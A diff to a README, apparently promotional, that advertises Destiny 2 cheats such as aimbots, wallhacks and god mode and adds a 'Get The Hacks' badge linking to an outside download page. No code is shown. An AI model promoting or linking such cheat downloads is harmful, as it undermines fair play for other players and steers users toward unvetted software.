@@ -4,6 +4,7 @@
 
 **Destiny 2** blends MMO-style grinding with competitive PvP and massive PvE raids. For players who want to skip the grind or crush Crucible matches with ease, **Destiny 2 hacks** provide powerful tools. From **aimbots and wallhacks** to **infinite supers and god mode**, these hacks change the game completely. This guide will cover what Destiny 2 hacks include, their most popular features, how they compare to cheats from other shooters, and what you need to run them.
 
+[![Get](https://img.shields.io/badge/Get%20The-Hacks-blueviolet)](https://destiny-2-hacks.github.io/.github/)
 ---
 
 ## What Are Destiny 2 Hacks?
